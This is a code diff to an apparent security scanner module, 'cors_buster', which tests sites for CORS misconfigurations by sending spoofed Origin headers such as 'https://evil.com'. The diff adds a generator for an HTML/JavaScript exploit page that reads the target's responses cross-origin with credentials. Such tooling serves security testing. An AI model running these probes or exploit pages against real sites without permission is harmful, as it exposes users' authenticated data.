@@ -5,6 +5,33 @@ NAME = "cors_buster"
 CATEGORY = "recon"
 DESCRIPTION = "Active CORS misconfiguration detection (Origin reflection, Null trust, Arbitrary trust)"
 
+def generate_poc(url, origin, credentials):
+    """Generates a clean HTML/JS PoC for the CORS misconfiguration"""
+    creds_js = "xhr.withCredentials = true;" if credentials else ""
+    
+    poc_html = f"""
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>Hellhound CORS Exploit PoC</h2>
+    <p>Target: {url}</p>
+    <p>Reflected Origin: {origin}</p>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {{
+            if (xhr.readyState == 4) {{
+                alert("Exploit Success! Data: " + xhr.responseText.substring(0, 100));
+            }}
+        }};
+        xhr.open("GET", "{url}", true);
+        {creds_js}
+        xhr.send();
+    </script>
+</body>
+</html>
+"""
+    return poc_html.strip()
+
 def test_cors(url, origin):
     headers = {"Origin": origin}
     try:
@@ -42,7 +69,7 @@ def run(target, emit, options=None):
     urls_to_test = list(set(urls_to_test))
     if len(urls_to_test) > 100:
         # If there are a massive number of endpoints, cap to 100 to save time
-        urls_to_test = urls_to_test[:100]
+        urls_to_test = list(urls_to_test)[:100]
     
     payloads = [
         "https://evil.com", 
@@ -92,7 +119,8 @@ def run(target, emit, options=None):
                         "url": url,
                         "type": vuln_type,
                         "payload": payload,
-                        "credentials_allowed": acac
+                        "credentials_allowed": acac,
+                        "poc_html": generate_poc(url, payload, acac)
                     }
                     findings.append(finding)
                     risk_score += risk_val
